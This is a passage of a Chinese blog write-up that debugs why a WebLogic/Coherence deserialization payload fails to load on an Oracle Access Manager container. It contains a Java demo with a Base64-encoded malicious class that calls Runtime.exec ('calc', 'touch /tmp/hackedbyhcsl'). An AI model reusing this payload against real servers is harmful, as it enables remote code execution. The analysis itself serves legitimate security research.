style=outline:none;text-decoration:none;color:inherit href=#hl-82-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-17>17</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.ClassLoader<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>main</span> <span style=color:#66d9ef>extends</span> ClassLoader <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;hi&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>new</span> main<span style=color:#f92672>().</span><span style=color:#a6e22e>df</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>df</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>        String data<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;yv66vgAAADQAOQoABwAlCAAmCAAnCgAoACkKACgAKgcANwcALAcALQcALgcALwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAQTHBlcnMvbmVvL3Rlc3QxOwEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACkV4Y2VwdGlvbnMHADABABRnZXRSZW1vdGVDb25zdHJ1Y3RvcgEANygpTGNvbS90YW5nb3NvbC9pbnRlcm5hbC91dGlsL2ludm9rZS9SZW1vdGVDb25zdHJ1Y3RvcjsBABRzZXRSZW1vdGVDb25zdHJ1Y3RvcgEAOChMY29tL3Rhbmdvc29sL2ludGVybmFsL3V0aWwvaW52b2tlL1JlbW90ZUNvbnN0cnVjdG9yOylWAQARcmVtb3RlQ29uc3RydWN0b3IBADVMY29tL3Rhbmdvc29sL2ludGVybmFsL3V0aWwvaW52b2tlL1JlbW90ZUNvbnN0cnVjdG9yOwEAEXNldFNlcnZlckxvY2F0aW9uAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylWAQABcwEAAnMxBwAxAQARZ2V0U2VydmVyTG9jYXRpb24BACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAAp0ZXN0MS5qYXZhDAALAAwBAARjYWxjAQAXdG91Y2ggL3RtcC9oYWNrZWRieWhjc2wHADIMADMANAwANQA2AQAOcGVycy9uZW8vdGVzdDEBABBqYXZhL2xhbmcvT2JqZWN0AQArY29tL3Rhbmdvc29sL2ludGVybmFsL3V0aWwvaW52b2tlL1JlbW90YWJsZQEALndlYmxvZ2ljL2NsdXN0ZXIvc2luZ2xldG9uL0NsdXN0ZXJNYXN0ZXJSZW1vdGUBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABhqYXZhL3JtaS9SZW1vdGVFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAvcGVycy9uZW8vdGVzdDEkOENFQUEwNTJDQTI2MjlFN0Q0QkFENjE5QjI5NDhGNTcBADFMcGVycy9uZW8vdGVzdDEkOENFQUEwNTJDQTI2MjlFN0Q0QkFENjE5QjI5NDhGNTc7ACEABgAHAAMACAAJAAoAAAAFAAEACwAMAAIADQAAAFcAAgACAAAAEyq3AAESAkwSA0y4AAQrtgAFV7EAAAACAA4AAAAWAAUAAAAPAAQAEAAHABEACgASABIAFAAPAAAAFgACAAAAEwAQADgAAAAHAAwAEgATAAEAFAAAAAQAAQAVAAEAFgAXAAEADQAAACwAAQABAAAAAgGwAAAAAgAOAAAABgABAAAAGQAPAAAADAABAAAAAgAQADgAAAABABgAGQABAA0AAAA1AAAAAgAAAAGxAAAAAgAOAAAABgABAAAAHwAPAAAAFgACAAAAAQAQADgAAAAAAAEAGgAbAAEAAQAcAB0AAgANAAAAPwAAAAMAAAABsQAAAAIADgAAAAYAAQAAACQADwAAACAAAwAAAAEAEAA4AAAAAAABAB4AEwABAAAAAQAfABMAAgAUAAAABAABACAAAQAhACIAAgANAAAANgABAAIAAAACAbAAAAACAA4AAAAGAAEAAAAoAA8AAAAWAAIAAAACABAAOAAAAAAAAgAeABMAAQAUAAAABAABACAAAQAjAAAAAgAk&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> b<span style=color:#f92672>=</span> Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getDecoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>decode</span><span style=color:#f92672>(</span>data<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?&gt;</span> c<span style=color:#f92672>=</span> defineClass<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;pers.neo.test1$8CEAA052CA2629E7D4BAD619B2948F57&#34;</span><span style=color:#f92672>,</span>b<span style=color:#f92672>,</span><span style=color:#ae81ff>0</span><span style=color:#f92672>,</span>b<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        String cname<span style=color:#f92672>=</span>c<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>cname<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220324173748317.png alt=image-20220324173748317></p><p><code>defineClass:-1 ClassLoader(java.lang)</code> 是native函数，进入后成功完成最外层操作，然后因为需要继续构造反序列化链，往里尝试寻找<code>com.tangosol.internal.util.invoke.Remotable</code> 类。</p><p>如下图，三步走。</p><ol><li>使用 <code>findLoadedClass(String)</code> 看类是否已被加载。</li><li>使用父类加载器loadClass，没有父类加载器为null就用虚拟机内置加载器。</li><li>使用findClass寻找。</li></ol><p><img loading=lazy src=image-20220325100044985.png alt=image-20220325100044985></p><p>步骤一findLoadedClass失败</p><p>步骤二的父类加载器依次是<code>sun.misc.Launcher$AppClassLoader</code>、 <code>sun.misc.Launcher$ExtClassLoader</code> 和null。</p><p><img loading=lazy src=image-20220325101613996.png alt=image-20220325101613996></p><p>步骤三findClass</p><p><img loading=lazy src=image-20220325102507468.png alt=image-20220325102507468></p><p>跟入，没有找到，抛出异常</p><p><img loading=lazy src=image-20220325102843921.png alt=image-20220325102843921></p><p>至此就完全解释了因为 <code>Caused By: java.lang.ClassNotFoundException: com.tangosol.internal.util.invoke.Remotable</code> 导致 <code>java.lang.NoClassDefFoundError: com/tangosol/internal/util/invoke/Remotable</code> 的问题了。</p><p>但至于是为什么找不到Remotable，就是另一个需要再尝试回答的问题了。</p><h4 id=添加依赖后本地可成功defineclass>添加依赖后本地可成功defineClass<a hidden class=anchor aria-hidden=true href=#添加依赖后本地可成功defineclass>#</a></h4><p>给上述demo的lib加上coherence.jar这个类之后报错变化了，缺少 <code>weblogic.cluster.singleton.ClusterMaster</code> 。再加上 <code>wlfullclient.jar</code> ，就OK了，成功define出这个类。</p><p><img loading=lazy src=image-20220325105132325.png alt=image-20220325105132325></p><h4 id=使用arthas在服务端能找到remotable-类>使用arthas在服务端能找到<code>Remotable</code> 类<a hidden class=anchor aria-hidden=true href=#使用arthas在服务端能找到remotable-类>#</a></h4><p>那就是说是因为服务端找不到这个类。可是我们可以看到 <code>com.tangosol.internal.util.invoke.Remotable</code> 这个类在oamms容器中有两处存在</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># cls=&#34;com.tangosol.internal.util.invoke.Remotable&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># grep -P &#34;$cls|\.jar&#34; oamms_tree.txt |grep -P &#34;$cls&#34; -B1 </span>
</span></span><span style=display:flex><span>/u01/oracle/coherence/lib/coherence.jar
</span></span><span style=display:flex><span>com/tangosol/internal/util/invoke/Remotable.class
</span></span><span style=display:flex><span>com/tangosol/internal/util/invoke/RemotableClassGenerator.class
</span></span><span style=display:flex><span>com/tangosol/internal/util/invoke/RemotableSupport.class
</span></span><span style=display:flex><span>--
</span></span><span style=display:flex><span>/u01/oracle/idm/oam/server/lib/jmx/coherence.jar
</span></span><span style=display:flex><span>com/tangosol/internal/util/invoke/Remotable.class
</span></span><span style=display:flex><span>com/tangosol/internal/util/invoke/RemotableClassGenerator.class
</span></span><span style=display:flex><span>com/tangosol/internal/util/invoke/RemotableSupport.class
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># grep -P &#34;$cls|\.jar&#34; oamms_tree.txt |grep -P &#34;$cls&#34; -B1 |grep jar |xargs -i{} docker exec oamms md5sum {}</span>
</span></span><span style=display:flex><span>b28ee46b9b9bd5c24df3bfee10075ba4  /u01/oracle/coherence/lib/coherence.jar
</span></span><span style=display:flex><span>7b30411369752fc711a257ea6fb7e3d1  /u01/oracle/idm/oam/server/lib/jmx/coherence.jar
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># grep -P &#34;$cls|\.jar&#34; oamms_tree.txt |grep -P &#34;$cls&#34; -B1 |grep jar |xargs -i{} docker exec oamms ls -lS {}</span>
</span></span><span style=display:flex><span>-rw-r----- <span style=color:#ae81ff>1</span> oracle oracle <span style=color:#ae81ff>13490976</span> Sep <span style=color:#ae81ff>12</span>  <span style=color:#ae81ff>2019</span> /u01/oracle/coherence/lib/coherence.jar
</span></span><span style=display:flex><span>-rw-r----- <span style=color:#ae81ff>1</span> oracle oracle <span style=color:#ae81ff>13490779</span> Sep <span style=color:#ae81ff>10</span>  <span style=color:#ae81ff>2019</span> /u01/oracle/idm/oam/server/lib/jmx/coherence.jar
</span></span></code></pre></td></tr></table></div></div><p>在容器中使用 arthas 也是能找到类的</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-50>50</a>
